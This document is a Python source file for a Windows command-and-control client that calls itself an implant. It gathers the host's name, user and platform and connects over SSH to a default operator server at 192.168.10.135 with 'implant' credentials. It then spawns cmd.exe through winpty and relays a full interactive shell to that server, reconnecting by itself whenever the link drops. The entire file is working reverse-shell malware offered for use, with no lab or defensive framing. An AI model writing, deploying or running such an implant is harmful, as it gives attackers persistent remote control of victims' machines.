import paramiko
import subprocess
import os
import sys
import socket
import getpass
import time
import logging
import argparse
import platform
import threading
from typing import Dict, Any
import winpty

logging.basicConfig(
    level=logging.ERROR,
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    handlers=[logging.StreamHandler()]
)
logger = logging.getLogger('C2Client')

class C2Client:
    """Windows C2 Client with PTY support"""
    
    def __init__(self, config: Dict[str, Any]):
        self.config = config
        self.ssh_client = None
        self.channel = None
        self.process = None
        self.running = True
        self.reconnect_delay = 5
        self.system_info = self._gather_system_info()
        
    def _gather_system_info(self) -> Dict[str, str]:
        """Gather basic system information"""
        info = {
            'hostname': socket.gethostname(),
            'username': getpass.getuser(),
            'platform': platform.system(),
            'version': platform.version(),
            'architecture': platform.machine()
        }
        return info
    
    def connect(self) -> bool:
        """Establish connection with PTY support"""
        try:
            self.ssh_client = paramiko.SSHClient()
            self.ssh_client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            
            logger.debug(f"Connecting to {self.config['server_ip']}:{self.config['server_port']}")
            self.ssh_client.connect(
                self.config['server_ip'],
                port=self.config['server_port'],
                username=self.config['username'],
                password=self.config['password'],
                timeout=10
            )
            
            self.channel = self.ssh_client.get_transport().open_session()
            self.channel.get_pty(term='vt100', width=80, height=24)
            self.channel.invoke_shell()
            
            if self.channel.active:
                client_info = f"Implant checked in from {self.system_info['hostname']} as {self.system_info['username']}\r\n"
                self.channel.send(client_info)
                logger.info("Successfully connected to C2 server")
                return True
                
            return False
            
        except Exception as e:
            logger.error(f"Connection error: {e}")
            return False

    def start_shell(self) -> bool:
        """Start system shell with winpty"""
        try:
            # Create winpty instance with default settings
            self.pty = winpty.PTY(
                cols=80,  # Use cols instead of width
                rows=24,  # Use rows instead of height
            )
            
            # Start cmd.exe using winpty
            proc_path = os.path.join(os.environ['SYSTEMROOT'], 'System32', 'cmd.exe')
            self.process = self.pty.spawn(proc_path)
            return True
            
        except Exception as e:
            logger.error(f"Error starting shell: {e}")
            return False

    def resize_pty(self, cols: int, rows: int):
        """Resize the PTY"""
        try:
            if hasattr(self, 'pty'):
                self.pty.resize(cols, rows)
        except Exception as e:
            logger.error(f"Error resizing PTY: {e}")

    def forward_io(self):
        """Handle bidirectional I/O using winpty"""
        def read_from_process():
            try:
                while self.running and self.pty and self.channel and self.channel.active:
                    data = self.pty.read()
                    if data:
                        self.channel.send(data.encode())
            except Exception as e:
                logger.error(f"Process read error: {e}")

        def read_from_channel():
            try:
                while self.running and self.channel and self.channel.active:
                    if self.channel.recv_ready():
                        data = self.channel.recv(1024)
                        if not data:
                            break
                        if self.pty:
                            self.pty.write(data.decode())
                    else:
                        time.sleep(0.05)
            except Exception as e:
                logger.error(f"Channel read error: {e}")
                self.running = False

        t1 = threading.Thread(target=read_from_process, name="ProcessReader")
        t2 = threading.Thread(target=read_from_channel, name="ChannelReader")
        t1.daemon = True
        t2.daemon = True
        t1.start()
        t2.start()

        while t1.is_alive() and t2.is_alive() and self.running:
            time.sleep(0.5)

    def command_loop(self):
        """Main command processing loop"""
        while self.running:
            try:
                if not self.channel or not self.channel.active:
                    logger.info("Channel inactive, reconnecting...")
                    self.disconnect()
                    time.sleep(self.reconnect_delay)
                    if not self.connect():
                        continue

                if not self.start_shell():
                    logger.error("Failed to start shell")
                    time.sleep(self.reconnect_delay)
                    continue

                self.forward_io()

                if self.running:
                    logger.info("Session ended, reconnecting...")
                    self.disconnect()
                    time.sleep(self.reconnect_delay)

            except KeyboardInterrupt:
                self.running = False
            except Exception as e:
                logger.error(f"Command loop error: {e}")
                self.disconnect()
                time.sleep(self.reconnect_delay)

    def disconnect(self):
        """Clean up and disconnect"""
        if self.process:
            try:
                self.process.terminate()
                self.process = None
            except:
                pass

        # if self.channel:
        #     try:
        #         self.channel.close()
        #         self.channel = None
        #     except:
        #         pass

        # if self.ssh_client:
        #     try:
        #         self.ssh_client.close()
        #         self.ssh_client = None
        #     except:
        #       pass

    def run(self):
        """Main entry point"""
        try:
            if self.connect():
                self.command_loop()
        finally:
            self.disconnect()



def parse_arguments():
    """Parse command line arguments"""
    parser = argparse.ArgumentParser(description="C2 Client")
    parser.add_argument("--server", default="192.168.10.135", help="C2 server address")
    parser.add_argument("--port", type=int, default=2222, help="C2 server port")
    parser.add_argument("--username", default="implant", help="Authentication username")
    parser.add_argument("--password", default="implant", help="Authentication password")
    parser.add_argument("--debug", action="store_true", help="Enable debug logging")
    return parser.parse_args()


def main():
    """Main entry point"""
    try:
        args = parse_arguments()
        
        # Configure logging level
        if args.debug:
            logger.setLevel(logging.DEBUG)
        
        config = {
            'server_ip': args.server,
            'server_port': args.port,
            'username': args.username,
            'password': args.password
        }
        
        client = C2Client(config)
        client.run()
        
    except Exception as e:
        logger.error(f"Error: {e}")


if __name__ == '__main__':
    main()